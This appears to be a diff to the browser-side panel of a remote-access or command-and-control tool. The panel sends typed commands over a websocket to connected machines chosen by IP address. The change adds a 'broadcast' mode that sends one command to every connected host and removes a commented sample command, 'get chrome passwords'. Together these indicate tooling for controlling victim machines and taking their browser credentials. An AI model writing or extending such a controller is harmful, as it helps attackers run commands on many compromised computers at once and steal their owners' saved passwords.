@@ -18,7 +18,6 @@
         //alert("Connected!")
         //client.send('The client connected!')
 
-
         client.onmessage = function (data) {
             if (data.data.startsWith("Connected$")) {
                 data = data.data.substr(11, data.data.length)
@@ -39,7 +38,7 @@
             } else {
                 console.log("Received: '" + data.data + "'");
                 content = data.data + "\n"
-                contentLength += content.length;
+                contentLength += content.length + 1;
                 console.log("length is " + contentLength)
                 document.getElementById('area').value += content
             }
@@ -55,9 +54,18 @@
             if (document.activeElement === document.getElementById('area')) {
                 //command = document.getElementById('area').innerText.substr(contentLength).value
                 command = [document.getElementById('area').value.substr(contentLength), document.getElementById('select ip').value]
-                //command = ['get chrome passwords', document.getElementById('select ip').value]
                 contentLength += command[0].length
                 console.log(command)
+                //Sending the command to every connected IP
+                if (command.toString().startsWith("broadcast")) {
+                    console.log("test")
+                    command[0] = command[0].substr(10, command[0].length)
+                    for (i = 0; i < document.getElementById("select ip").options.length; i++) {
+                        command[1] = document.getElementById('select ip').options[i].text
+                        sendCommand()
+                    }
+                    return
+                }
                 sendCommand()
                 //alert('test')
             }
